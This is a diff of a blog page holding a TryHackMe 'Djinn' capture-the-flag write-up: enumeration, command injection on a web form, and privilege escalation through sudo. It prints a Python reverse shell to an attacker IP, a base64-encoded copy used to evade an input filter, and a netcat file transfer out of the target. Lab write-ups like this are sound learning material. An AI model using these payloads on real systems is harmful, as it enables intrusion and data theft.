@@ -6,30 +6,31 @@
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="stylesheet" type="text/css" href="/css/style.css">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&family=Inconsolata&family=Source+Code+Pro&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com"> 
+  <link
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  rel="stylesheet"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com">
   <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
-  <!--<script src="/dist/mark.min.js" charset="UTF-8"></script>-->
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
 <title>TryHackMe - Djinn writeup &mdash; fmash16's blog</title>
 <meta property="og:title" content="TryHackMe - Djinn Writeup" />
       <meta property="og:description" content="An intermediate level box having an implentation of flask. Needs some python scripting and port knocking to get user. Root privilege escalation using lxc container for user with lxd group membership." />
       <meta property="og:type" content="article" />
       <meta property="og:url" content="github" />
-      <meta property="og:image" content="https://fmash16.github.io/img/tryhackme_djinn/card.png" />
+      <meta property="og:image" content="https://fmash16.github.io//img/tryhackme_djinn/card.png" />
 
 </head>
 
-<body>
-<!-- <h1 class=blogtitle>./fmash16's blog </h1> -->
-<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">
- ___               _   ___   ___ 
-|  _|_____ ___ ___| |_|_  | |  _|
-|  _|     | .'|_ -|   |_| |_| . |
-|_| |_|_|_|__,|___|_|_|_____|___|
-                 u/fmash16's blog</pre>
+<div class=blogtitle><a href="/index.html">fmash16's blog</a></div> 
+<!--<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">-->
+ <!--___               _   ___   ___ -->
+<!--|  _|_____ ___ ___| |_|_  | |  _|-->
+<!--|  _|     | .'|_ -|   |_| |_| . |-->
+<!--|_| |_|_|_|__,|___|_|_|_____|___|-->
+                 <!--./fmash16's blog</pre>-->
 <nav>
-   <a href="/index.html">home</a>
+   <!--<a href="/index.html">home</a>-->
    <a href="/archive.html">archive</a>
    <a href="mailto:fmash16@gmail.com">mail</a>
    <a href="https://github.com/fmash16">github</a>
@@ -39,39 +40,43 @@
 </nav>
 
 <article>
-<input id="toggle" type="checkbox" checked>
-<label for="toggle">TOC</label>
-<nav class='toc'>
-    <ul>
-    <li><a href="#tryhackme---djinn-writeup">TryHackMe - Djinn writeup</a></li>
-    <li><a href="#nmap-scan">Nmap Scan</a></li>
-    <li><a href="#enumeration">Enumeration</a>
-    <ul>
-    <li><a href="#ftp--port-21">ftp -port 21</a></li>
-    <li><a href="#port-1337">Port 1337</a></li>
-    </ul></li>
-    <li><a href="#winning-the-game">Winning the game</a></li>
-    <li><a href="#port-knock">Port knock</a></li>
-    <li><a href="#port-7331-enum">Port 7331 enum</a>
-    <ul>
-    <li><a href="#ffuf-fuzzing">ffuf fuzzing</a></li>
-    <li><a href="#remote-code-executeion">Remote Code Executeion</a></li>
-    <li><a href="#reverse-shell-www-data">Reverse shell (www-data)</a></li>
-    </ul></li>
-    <li><a href="#privilege-escalation-user-nitish">Privilege escalation : User nitish</a></li>
-    <li><a href="#privilege-escalation-user-sam">Privilege Escalation : User sam</a></li>
-    <li><a href="#privilege-escalation---root">Privilege Escalation - Root</a>
-    <ul>
-    <li><a href="#first-way---sudo-permissions">First way - sudo permissions</a></li>
-    <li><a href="#second-cooler-way-lxc-container">Second (Cooler) way : lxc container</a></li>
-    </ul></li>
-    </ul>
-</nav>
+<ul>
+<li><a href="#tryhackme---djinn-writeup">TryHackMe - Djinn
+writeup</a></li>
+<li><a href="#nmap-scan">Nmap Scan</a></li>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#ftp--port-21">ftp -port 21</a></li>
+<li><a href="#port-1337">Port 1337</a></li>
+</ul></li>
+<li><a href="#winning-the-game">Winning the game</a></li>
+<li><a href="#port-knock">Port knock</a></li>
+<li><a href="#port-7331-enum">Port 7331 enum</a>
+<ul>
+<li><a href="#ffuf-fuzzing">ffuf fuzzing</a></li>
+<li><a href="#remote-code-executeion">Remote Code Executeion</a></li>
+<li><a href="#reverse-shell-www-data">Reverse shell (www-data)</a></li>
+</ul></li>
+<li><a href="#privilege-escalation-user-nitish">Privilege escalation :
+User nitish</a></li>
+<li><a href="#privilege-escalation-user-sam">Privilege Escalation : User
+sam</a></li>
+<li><a href="#privilege-escalation---root">Privilege Escalation -
+Root</a>
+<ul>
+<li><a href="#first-way---sudo-permissions">First way - sudo
+permissions</a></li>
+<li><a href="#second-cooler-way-lxc-container">Second (Cooler) way : lxc
+container</a></li>
+</ul></li>
+</ul>
 <h1 id="tryhackme---djinn-writeup">TryHackMe - Djinn writeup</h1>
 <p>We add the machine IP to out /etc/hosts file</p>
-<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;10.10.248.62 djinn.thm&quot;</span> <span class="op">&gt;&gt;</span> /etc/hosts</span></code></pre></div>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;10.10.248.62 djinn.thm&quot;</span> <span class="op">&gt;&gt;</span> /etc/hosts</span></code></pre></div>
 <h1 id="nmap-scan">Nmap Scan</h1>
-<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="at">-sS</span> <span class="at">-oN</span> nmap.out djinn.thm</span>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="at">-sS</span> <span class="at">-oN</span> nmap.out djinn.thm</span>
 <span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-Pn</span> <span class="at">-p-</span> djinn.thm</span></code></pre></div>
 <p>Open ports:</p>
 <ul>
@@ -82,7 +87,9 @@
 </ul>
 <h1 id="enumeration">Enumeration</h1>
 <h2 id="ftp--port-21">ftp -port 21</h2>
-<p>ftp allows anonymous login. So we login with username <code>anonymous</code> and null password. Found 3 files. Contents are as following</p>
+<p>ftp allows anonymous login. So we login with username
+<code>anonymous</code> and null password. Found 3 files. Contents are as
+following</p>
 <ul>
 <li><p>creds.txt :</p>
 <pre><code>nitu:81299</code></pre>
@@ -101,21 +108,27 @@ And don&#39;t mess up anything.</code></pre></li>
 </ul>
 <h2 id="port-1337">Port 1337</h2>
 <p>We try connecting to the port 1337 with nc</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> djinn.thm 1337</span></code></pre></div>
-<p>And we get a “game” that tells us that we can get our gift after 1000 successful simple maths.</p>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> djinn.thm 1337</span></code></pre></div>
+<p>And we get a “game” that tells us that we can get our gift after 1000
+successful simple maths.</p>
 <p><img src="/img/tryhackme_djinn/1.png" /></p>
 <h1 id="winning-the-game">Winning the game</h1>
-<p>In order to win the game, lets write a simple python script that will perform and submit the 1000 calucultaions for us. We will be using pwntools for this. It can be installed using</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt-get install python-pwntools</span></code></pre></div>
+<p>In order to win the game, lets write a simple python script that will
+perform and submit the 1000 calucultaions for us. We will be using
+pwntools for this. It can be installed using</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt-get install python-pwntools</span></code></pre></div>
 <p>Our python script stands as follows:</p>
-<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co">#! /usr/bin/env python</span></span>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co">#! /usr/bin/env python</span></span>
 <span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> sys</span>
 <span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
 <span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> solve(hostname, port):</span>
 <span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>    conn <span class="op">=</span> remote(hostname, port)</span>
-<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>    banner <span class="op">=</span> conn.recvuntil(b<span class="st">&quot;gift.</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>    banner <span class="op">=</span> conn.recvuntil(<span class="st">b&quot;gift.</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
 <span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>    problem <span class="op">=</span> (conn.recvline()).decode()</span>
 <span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(problem)</span>
 <span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>    count <span class="op">=</span> <span class="dv">1</span></span>
@@ -148,23 +161,49 @@ And don&#39;t mess up anything.</code></pre></li>
 <span id="cb8-38"><a href="#cb8-38" aria-hidden="true" tabindex="-1"></a>    port <span class="op">=</span> <span class="bu">int</span>(sys.argv[<span class="dv">2</span>])</span>
 <span id="cb8-39"><a href="#cb8-39" aria-hidden="true" tabindex="-1"></a>    solve(hostname, port)</span></code></pre></div>
 <p>We run this script and wait for our gift.</p>
-<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> solve.py 10.10.248.62 1337</span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> solve.py 10.10.248.62 1337</span></code></pre></div>
 <p>And we get our gift</p>
 <p><img src="/img/tryhackme_djinn/3.png" /></p>
 <p>These seem like port numbers: 1356, 6784, 3409</p>
 <h1 id="port-knock">Port knock</h1>
-<p>This was new to me. Port knocking adds extra security against mass port scans. As per wikipedia, “In computer networking, port knocking is a method of externally opening ports on a firewall by generating a connection attempt on a set of prespecified closed ports. Once a correct sequence of connection attempts is received, the firewall rules are dynamically modified to allow the host which sent the connection attempts to connect over specific port(s). A variant called single packet authorization (SPA) exists, where only a single”knock" is needed, consisting of an encrypted packet. The primary purpose of port knocking is to prevent an attacker from scanning a system for potentially exploitable services by doing a port scan, because unless the attacker sends the correct knock sequence, the protected ports will appear closed. "</p>
-<p>So if we knock on a certain set of ports in a certain serial, it can open another port running a service. Now we saw before in out nmap scan that port 22 for SSH was “filtered”. Meaning nmap could not determine the state of the port and it can be either open or closed. As we tried to ssh into the box, we got a closed port. So maybe through knocking the ports in the seiral gotten from the port 1337 game, we can get the ssh port to open?</p>
-<p>We try the knocking using this simple bash loop that knocks the ports using nmap</p>
-<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> ip <span class="kw">in</span> 1356, 6784, 3409<span class="kw">;</span> <span class="cf">do</span> <span class="fu">nmap</span> <span class="at">-Pn</span> <span class="at">-p</span> <span class="va">$ip</span> djinn.thm<span class="kw">;</span> <span class="cf">done</span></span></code></pre></div>
-<p>Now we can connect to port 22! But we see that the creds found in the ftp are not correct. We get a permission denied with the ftp found creds.</p>
+<p>This was new to me. Port knocking adds extra security against mass
+port scans. As per wikipedia, “In computer networking, port knocking is
+a method of externally opening ports on a firewall by generating a
+connection attempt on a set of prespecified closed ports. Once a correct
+sequence of connection attempts is received, the firewall rules are
+dynamically modified to allow the host which sent the connection
+attempts to connect over specific port(s). A variant called single
+packet authorization (SPA) exists, where only a single”knock” is needed,
+consisting of an encrypted packet. The primary purpose of port knocking
+is to prevent an attacker from scanning a system for potentially
+exploitable services by doing a port scan, because unless the attacker
+sends the correct knock sequence, the protected ports will appear
+closed. ”</p>
+<p>So if we knock on a certain set of ports in a certain serial, it can
+open another port running a service. Now we saw before in out nmap scan
+that port 22 for SSH was “filtered”. Meaning nmap could not determine
+the state of the port and it can be either open or closed. As we tried
+to ssh into the box, we got a closed port. So maybe through knocking the
+ports in the seiral gotten from the port 1337 game, we can get the ssh
+port to open?</p>
+<p>We try the knocking using this simple bash loop that knocks the ports
+using nmap</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> ip <span class="kw">in</span> 1356, 6784, 3409<span class="kw">;</span> <span class="cf">do</span> <span class="fu">nmap</span> <span class="at">-Pn</span> <span class="at">-p</span> <span class="va">$ip</span> djinn.thm<span class="kw">;</span> <span class="cf">done</span></span></code></pre></div>
+<p>Now we can connect to port 22! But we see that the creds found in the
+ftp are not correct. We get a permission denied with the ftp found
+creds.</p>
 <h1 id="port-7331-enum">Port 7331 enum</h1>
-<p>Lets have a look at this port. Netcating it, we don’t receive anything, but we connect to it. We go to the port on browser and find a web server running.</p>
+<p>Lets have a look at this port. Netcating it, we don’t receive
+anything, but we connect to it. We go to the port on browser and find a
+web server running.</p>
 <p><img src="/img/tryhackme_djinn/4.png" /></p>
 <p>The page doesn’t have any functionality.</p>
 <h2 id="ffuf-fuzzing">ffuf fuzzing</h2>
 <p>We fuzz the URI using ffuf</p>
-<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ffuf</span> <span class="at">-c</span> <span class="at">-w</span> /usr/share/dirbuster/directory-list-2.3-medium.txt <span class="at">-u</span> <span class="dt">\</span></span>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ffuf</span> <span class="at">-c</span> <span class="at">-w</span> /usr/share/dirbuster/directory-list-2.3-medium.txt <span class="at">-u</span> <span class="dt">\</span></span>
 <span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>    http://djinn.thm:7331/FUZZ <span class="at">-e</span> .txt,.php</span></code></pre></div>
 <p>We find two pages:</p>
 <ul>
@@ -174,15 +213,21 @@ And don&#39;t mess up anything.</code></pre></li>
 <p>Going over to http://djinn.thm:7331/wish we find</p>
 <p><img src="/img/tryhackme_djinn/5.png" /></p>
 <h2 id="remote-code-executeion">Remote Code Executeion</h2>
-<p>So we have some sort of RCE here. We input a command <code>id</code> and get redirected to the following URL</p>
+<p>So we have some sort of RCE here. We input a command <code>id</code>
+and get redirected to the following URL</p>
 <pre><code>http://djinn.thm:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A</code></pre>
 <h2 id="reverse-shell-www-data">Reverse shell (www-data)</h2>
-<p>So the output of the command gets passed into the “name” var of the /genie page. Lets try getting a reverse shell with python</p>
-<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> <span class="at">-c</span> <span class="st">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.9.17.253&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span></span></code></pre></div>
+<p>So the output of the command gets passed into the “name” var of the
+/genie page. Lets try getting a reverse shell with python</p>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> <span class="at">-c</span> <span class="st">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.9.17.253&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span></span></code></pre></div>
 <p>And we get redirected to the following</p>
 <pre><code>http://djinn.thm:7331/genie?name=Wrong+choice+of+words</code></pre>
-<p>“Wrong choice of words”. There appears to be some filtering of the user supplied input here. Lets try base64 encoding our payload and then passing it to bash as follows:</p>
-<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> <span class="at">-c</span> <span class="dt">\</span></span>
+<p>“Wrong choice of words”. There appears to be some filtering of the
+user supplied input here. Lets try base64 encoding our payload and then
+passing it to bash as follows:</p>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> <span class="at">-c</span> <span class="dt">\</span></span>
 <span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;import socket,subprocess,os;\</span></span>
 <span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="st">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\</span></span>
 <span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="st">s.connect((\&quot;10.9.17.253\&quot;,1234));\</span></span>
@@ -190,39 +235,56 @@ And don&#39;t mess up anything.</code></pre></li>
 <span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="st">os.dup2(s.fileno(),1);\ </span></span>
 <span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a><span class="st">os.dup2(s.fileno(),2);\</span></span>
 <span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="st">p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]); | base64&#39;</span></span></code></pre></div>
-<p>And we get our encoded payload. Now we pass this payload, decode it and execute it on the box. We pass the following cmd:</p>
-<div class="sourceCode" id="cb16"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span></span>
+<p>And we get our encoded payload. Now we pass this payload, decode it
+and execute it on the box. We pass the following cmd:</p>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span></span>
 <span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="ex">cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuOS4xNy4yNTMiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycK</span></span>
 <span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span></span>
-<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="ex">base64</span> <span class="at">-d</span> <span class="kw">|</span> <span class="fu">bash</span></span></code></pre></div>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="fu">base64</span> <span class="at">-d</span> <span class="kw">|</span> <span class="fu">bash</span></span></code></pre></div>
 <p>We open a nc listener on port 1234 and get a shell back.</p>
-<h1 id="privilege-escalation-user-nitish">Privilege escalation : User nitish</h1>
-<p>Looking around the machine, we find two users under the home directory:</p>
+<h1 id="privilege-escalation-user-nitish">Privilege escalation : User
+nitish</h1>
+<p>Looking around the machine, we find two users under the home
+directory:</p>
 <ul>
 <li>nitish</li>
 <li>sam</li>
 </ul>
-<p>In the home directory of the user nitish, we find a hidden directory “.dev” that contains a file creds.txt. The file gives us the creds for the user nitish</p>
+<p>In the home directory of the user nitish, we find a hidden directory
+“.dev” that contains a file creds.txt. The file gives us the creds for
+the user nitish</p>
 <pre><code>nitish:p4************n9</code></pre>
 <p>Now we can login as nitish to the box using ssh.</p>
-<h1 id="privilege-escalation-user-sam">Privilege Escalation : User sam</h1>
-<p>Checking for the sudo permissions of the user with <code>sudo -l</code>, we find the following</p>
+<h1 id="privilege-escalation-user-sam">Privilege Escalation : User
+sam</h1>
+<p>Checking for the sudo permissions of the user with
+<code>sudo -l</code>, we find the following</p>
 <p><img src="/img/tryhackme_djinn/6.png" /></p>
-<p>So the user can execute <code>/usr/bin/genie</code> as the user sam. So we run</p>
-<div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> <span class="at">-u</span> sam /usr/bin/genie</span></code></pre></div>
+<p>So the user can execute <code>/usr/bin/genie</code> as the user sam.
+So we run</p>
+<div class="sourceCode" id="cb18"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> <span class="at">-u</span> sam /usr/bin/genie</span></code></pre></div>
 <p>This prints us the usage</p>
 <p>We can print the help message using <code>-h</code> tag</p>
 <p><img src="/img/tryhackme_djinn/8.png" /></p>
-<p>Let’s look if we can find some source for the program genie using find</p>
-<div class="sourceCode" id="cb19"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-name</span> <span class="st">&quot;*genie*&quot;</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span></code></pre></div>
+<p>Let’s look if we can find some source for the program genie using
+find</p>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-name</span> <span class="st">&quot;*genie*&quot;</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span></code></pre></div>
 <p>And we find the following</p>
 <p><img src="/img/tryhackme_djinn/9.png" /></p>
-<p>We find that there is a man page for genie. Let’s have a look at it.</p>
+<p>We find that there is a man page for genie. Let’s have a look at
+it.</p>
 <p><img src="/img/tryhackme_djinn/10.png" /></p>
-<p>We see that we can get a shell with the -p tag and execute any command using the “-cmd” tag. And we see that the program runs as sam SUID. So let’s run the following and see what happens</p>
-<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> <span class="at">-u</span> sam /usr/bin/genie <span class="at">-p</span> /bin/bash <span class="at">-cmd</span> ls</span></code></pre></div>
+<p>We see that we can get a shell with the -p tag and execute any
+command using the “-cmd” tag. And we see that the program runs as sam
+SUID. So let’s run the following and see what happens</p>
+<div class="sourceCode" id="cb20"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> <span class="at">-u</span> sam /usr/bin/genie <span class="at">-p</span> /bin/bash <span class="at">-cmd</span> ls</span></code></pre></div>
 <p>And we get a shell as user sam.</p>
-<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nitish@djinn:~$</span> sudo <span class="at">-u</span> sam /usr/bin/genie <span class="at">-p</span> /bin/bash <span class="at">-cmd</span> ls</span>
+<div class="sourceCode" id="cb21"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nitish@djinn:~$</span> sudo <span class="at">-u</span> sam /usr/bin/genie <span class="at">-p</span> /bin/bash <span class="at">-cmd</span> ls</span>
 <span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="ex">my</span> man!!</span>
 <span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> id</span>
 <span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">sam</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">sam</span><span class="kw">)</span></span>
@@ -230,19 +292,29 @@ And don&#39;t mess up anything.</code></pre></li>
 <span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span></span></code></pre></div>
 <h1 id="privilege-escalation---root">Privilege Escalation - Root</h1>
 <h2 id="first-way---sudo-permissions">First way - sudo permissions</h2>
-<p>Checking for sudo permissions for the user sam, we find the following</p>
+<p>Checking for sudo permissions for the user sam, we find the
+following</p>
 <p><img src="/img/tryhackme_djinn/11.png" /></p>
 <p>So running the following as su we get the following prompt:</p>
 <p><img src="/img/tryhackme_djinn/12.png" /></p>
-<p>The other options does not seem to give us much. So we have to somehow guess the correct number. Let’s see if we can find some source.</p>
-<p>In the home directory of the user sam , we find a file name “.pyc”. This is supposed to be a <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiQycD6nbjqAhUSXnwKHUckBHcQFjALegQIBhAB&amp;url=https%3A%2F%2Fwww.tutorialspoint.com%2FWhat-are-pyc-files-in-Python&amp;usg=AOvVaw1Za-3VtLAN7SSMzbKL7Cwp">python byte compiled file</a></p>
+<p>The other options does not seem to give us much. So we have to
+somehow guess the correct number. Let’s see if we can find some
+source.</p>
+<p>In the home directory of the user sam , we find a file name “.pyc”.
+This is supposed to be a <a
+href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiQycD6nbjqAhUSXnwKHUckBHcQFjALegQIBhAB&amp;url=https%3A%2F%2Fwww.tutorialspoint.com%2FWhat-are-pyc-files-in-Python&amp;usg=AOvVaw1Za-3VtLAN7SSMzbKL7Cwp">python
+byte compiled file</a></p>
 <p>We transfer the file to our local machine with netcat</p>
-<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 10.9.17.253 8888 <span class="op">&lt;</span> .pyc      <span class="co"># On target</span></span>
+<div class="sourceCode" id="cb22"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 10.9.17.253 8888 <span class="op">&lt;</span> .pyc      <span class="co"># On target</span></span>
 <span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lnvp</span> 8888 <span class="op">&gt;</span> program.pyc     <span class="co"># On host</span></span></code></pre></div>
